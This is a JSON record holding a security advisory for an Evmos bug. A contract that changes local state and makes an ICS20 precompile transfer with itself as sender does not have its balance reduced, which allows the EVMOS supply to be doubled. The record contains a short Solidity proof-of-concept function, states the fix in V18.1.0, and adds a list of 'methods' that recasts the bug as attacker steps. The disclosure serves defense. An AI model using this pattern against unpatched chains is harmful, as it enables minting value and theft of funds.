{"description": "### Summary\n_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._\n\n### Details\nWe discovered a bug walking through how to liquid stake using Safe which itself is a contract. The bug only appears when there is a local state change together with an ICS20 transfer in the same function and uses the contract's balance, that is using the contract address as the `sender` parameter in an ICS20 transfer using the ICS20 precompile\n\n### Proof of Concept\n```solidity\n// This function does not reduce the contract balance correctly but liquid stakes correctly \nfunction transfer(\n        string memory sourcePort,\n        string memory sourceChannel,\n        string memory denom,\n        uint256 amount,\n        string memory receiver,\n        string memory evmosReceiver\n    ) external returns (uint64 nextSequence) {\n        counter += 1; # Only happens when there is a local state update together with an ICS20 Transfer\n        Height memory timeoutHeight =  Height(100, 100);\n        string memory memo = buildLiquidStakeMemo(receiver, evmosReceiver);\n        return ICS20_CONTRACT.transfer(\n            sourcePort, \n            sourceChannel,\n            denom,\n            amount,\n            address(this), # this is the sender address which is the contract\n            receiver,\n            timeoutHeight,\n            0,\n            memo\n        );\n    }\n```\n\n### Impact\nThis is in essence the \"infinite money glitch\" allowing contracts to double the supply of Evmos after each transaction.\n\n### Severity\n\nBased on [ImmuneFi Severity Classification System](https://immunefisupport.zendesk.com/hc/en-us/articles/13332717597585-Severity-Classification-System) the severity was evaluated to `Critical` since the attack could have lead to create new supply of EVMOS and therefore lead to Direct loss of funds's value.\n\n### Patches\n\nThe issue has been patched in versions >=V18.1.0. \n\n## For more information\nIf you have any questions or comments about this advisory:\n\nReach out to the Core Team in [Discord](https://discord.gg/evmos)\nOpen a discussion in [evmos/evmos](https://github.com/evmos/evmos/discussions)\nEmail us at [security@evmos.org](mailto:security@evmos.org) for security questions\n", "methods": ["Used a bug in a contract's balance update function to create new supply of EVMOS.", "Exploited a vulnerability in the contract's balance update function to double the supply of EVMOS after each transaction.", "Used a local state change together with an ICS20 transfer in the same function to trigger the bug.", "Used the contract's balance, that is using the contract address as the `sender` parameter in an ICS20 transfer using the ICS20 precompile."]}